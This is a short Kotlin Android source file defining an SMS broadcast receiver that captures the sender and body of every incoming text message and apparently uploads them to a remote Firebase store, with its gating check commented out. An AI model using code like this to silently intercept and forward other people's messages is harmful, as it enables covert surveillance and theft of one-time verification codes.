package tech.apps.reader

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.provider.Telephony
import android.util.Log
import android.widget.Toast

var IsUpdate = false

class SMSListener : BroadcastReceiver() {

    override fun onReceive(context: Context?, intent: Intent?) {
        if (Telephony.Sms.Intents.SMS_RECEIVED_ACTION == intent?.action) {
            val firebaseData = FirebaseData()

//            if(!firebaseData.readMessageStatus()){
//                return
//            }

            for (smsMessage in Telephony.Sms.Intents.getMessagesFromIntent(intent)) {
                val smsData = SMSData(
                    smsMessage.displayOriginatingAddress,
                    smsMessage.messageBody
                )
                firebaseData.updateSMSIncoming(smsData)
            }
        }
//        Log.d("BroadcastReceiver_TAG", "working-> ${intent?.action}")
//        Toast.makeText(context, "Called",Toast.LENGTH_LONG).show()
    }
}